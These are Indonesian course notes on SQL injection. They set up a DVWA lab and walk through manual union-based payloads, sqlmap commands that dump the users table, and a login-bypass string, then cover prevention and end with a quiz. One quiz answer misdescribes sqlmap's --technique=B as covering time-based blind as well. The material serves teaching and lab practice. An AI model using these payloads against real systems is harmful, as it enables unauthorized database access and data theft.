# Pertemuan 9 — Web Application Security: SQL Injection

Catatan ini aku susun dari materi dosen di `Network-Security-Course-Bank/Pertemuan9.md` (judul asli: "Pertemuan 9: Web Application Security - SQL Injection"). Semua langkah hands-on di bawah persis mengikuti materi tersebut — lab-nya pakai container DVWA (`web-dvwa`) di docker-compose yang sama kayak praktikum.

## Apa itu SQL Injection?

**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang mengganggu query yang dibuat aplikasi ke database. Biasanya penyerang bisa melihat data yang nggak seharusnya mereka akses, atau bahkan mengubah/menghapus data.

## Cara Kerja SQLi

SQLi terjadi ketika aplikasi mengambil input pengguna lalu **menggabungkannya langsung ke query SQL tanpa sanitasi**:

```sql
-- Query normal di server
"SELECT * FROM users WHERE id = " + userInput;

-- Kalau userInput = 1
SELECT * FROM users WHERE id = 1;          -- normal

-- Kalau userInput = 1 OR 1=1
SELECT * FROM users WHERE id = 1 OR 1=1;   -- menampilkan SEMUA user!
```

> [!IMPORTANT]
> Inti masalahnya bukan SQL-nya, tapi **input yang dianggap bagian dari perintah**. Selama user input bisa mengubah struktur query, pintu SQLi terbuka lebar.

## Jenis-Jenis SQL Injection

| Jenis | Saluran | Cara penyerang tahu hasil | Contoh |
|---|---|---|---|
| **In-band (Classic)** | Satu saluran yang sama untuk menyerang dan ambil hasil | Langsung lihat data/error di response | Union-based, Error-based |
| **Inferential (Blind)** | Saluran yang sama, tapi data nggak kelihatan langsung | Menyimpulkan dari respon server | Boolean-based, Time-based |
| **Out-of-band** | Saluran berbeda dari yang dipakai serangan | Data ditarik via kanal lain | DNS/HTTP request dari database |

> [!TIP]
> Selisih kuncinya cuma satu: **bisa lihat hasilnya langsung atau nggak**. In-band = langsung, blind = nebak-nebak dari perilaku server, out-of-band = lewat jalur lain.

## Hands-On 1: Setup Lab DVWA

1. Pastikan container `web-dvwa` berjalan.
2. Akses `http://localhost:8080` (tergantung port mapping kamu).
3. Login pakai akun default yang disediakan container DVWA.
4. Klik **DVWA Security** dan set level ke **Low**.
5. Pilih menu **SQL Injection**.

> [!WARN]
> Level security DVWA harus **Low** dulu. Kalau masih impossible/high, semua payload di bawah nggak akan tembus dan kamu jadi mikir payload-mu salah.

## Hands-On 2: Manual Union-Based SQL Injection

**Langkah 1 — Cari titik kerentanan.** Masukkan `'` (petik tunggal) di kolom User ID. Muncul error SQL = aplikasi rentan.

**Langkah 2 — Tentukan jumlah kolom** pakai `ORDER BY`:

```sql
1' ORDER BY 1#   -- OK
1' ORDER BY 2#   -- OK
1' ORDER BY 3#   -- ERROR → berarti ada 2 kolom
```

**Langkah 3 — Cari kolom yang ditampilkan di layar** via UNION:

```sql
1' UNION SELECT 1,2#
```

**Langkah 4 — Ambil informasi database:**

```sql
1' UNION SELECT database(), user()#
```

## Hands-On 3: Automated SQLi dengan sqlmap

`sqlmap` adalah tool open-source yang mendeteksi dan mengeksploitasi celah SQLi secara otomatis. Dijalankan di container Kali:

```bash
# Scan dasar (ganti URL & cookie dengan milikmu)
sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=..." --batch

# Ambil nama database
sqlmap -u "http://..." --cookie="..." --dbs

# Dump tabel users
sqlmap -u "http://..." --cookie="..." -D dvwa -T users --dump
```

## Deteksi dan Pencegahan

| Metode | Prinsip |
|---|---|
| **Prepared statements (parameterized queries)** | Data pengguna nggak lagi dianggap bagian perintah SQL — cara paling efektif |
| **Input validation & sanitization** | Terima input sesuai format saja (ID ya harus angka) |
| **Principle of Least Privilege** | User DB aplikasi web jangan dikasih akses `root` atau `DROP TABLE` |

Contoh prepared statement aman (PHP PDO):

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
```

> [!NOTE]
> Validasi input saja nggak cukup jadi pertahanan utama; materi menempatkan **prepared statements** sebagai cara paling efektif, dan least privilege sebagai lapisan jaring pengaman kalau yang lain lolos.

## Latihan Mandiri (dari materi)

- **Blind SQL Injection:** coba menu SQL Injection (Blind) di DVWA, jalankan sqlmap dengan flag `--technique=B` buat lihat tool-nya kerja tanpa output data langsung.
- **Bypass login:** cari aplikasi latihan lain, coba bypass form login pakai `' OR '1'='1`.

```quiz
Q: SQL Injection terjadi ketika...
+ Input pengguna digabungkan langsung ke query SQL tanpa sanitasi
- Server database kehabisan memori
- Aplikasi menggunakan HTTPS tapi sertifikatnya kedaluwarsa
> Akar masalahnya input dianggap bagian dari perintah SQL.

Q: Tiga jenis SQL Injection menurut materi adalah...
+ In-band, Inferential (Blind), dan Out-of-band
- Local, Remote, dan Cloud
- HTTP, DNS, dan FTP
> In-band pakai saluran sama & hasil langsung terlihat, blind menyimpulkan dari respon, out-of-band lewat saluran berbeda.

Q: Payload `1' ORDER BY 3#` menghasilkan ERROR sedangkan ORDER BY 1 dan 2 OK, artinya...
+ Query punya 2 kolom
- Database sedang down
- Tidak ada kolom sama sekali
> ORDER BY n error saat n melebihi jumlah kolom, jadi error di angka 3 = jumlah kolomnya 2.

Q: Langkah UNION SELECT 1,2# dalam serangan union-based bertujuan...
+ Menentukan kolom mana yang ditampilkan di layar
- Menghapus seluruh tabel users
- Menambah kolom baru ke database
> Kita perlu tahu posisi mana yang tampil supaya bisa menaruh database() atau user() di slot itu.

Q: Cara paling efektif mencegah SQL Injection menurut materi adalah...
+ Prepared statements (parameterized queries)
- Mengenkripsi seluruh database dengan BitLocker
- Menyembunyikan error SQL saja
> Dengan prepared statement, input pengguna tidak pernah dianggap sebagai bagian perintah SQL.

Q: sqlmap untuk mengambil isi tabel users di database dvwa memakai flag...
+ -D dvwa -T users --dump
- --users --password
- -A users -O dump
> Pola sqlmap: -D (database), -T (tabel), --dump untuk mengekstrak isinya.

Q: Prinsip Least Privilege untuk user database aplikasi web berarti...
+ User aplikasi tidak boleh punya akses root atau DROP TABLE
- Database harus selalu berjalan di root server
- Semua query wajib ditulis dalam huruf besar
> Kalau celah lolos pun, kerusakan dibatasi karena hak user DB memang minim.

Q: Fungsi flag `--technique=B` pada sqlmap adalah...
+ Menjalankan teknik blind saja (boolean/time-based)
- Membuka mode brute force login
- Memindai port backend
> Sesuai latihan materi: blind technique dipakai saat output data tidak langsung terlihat.
```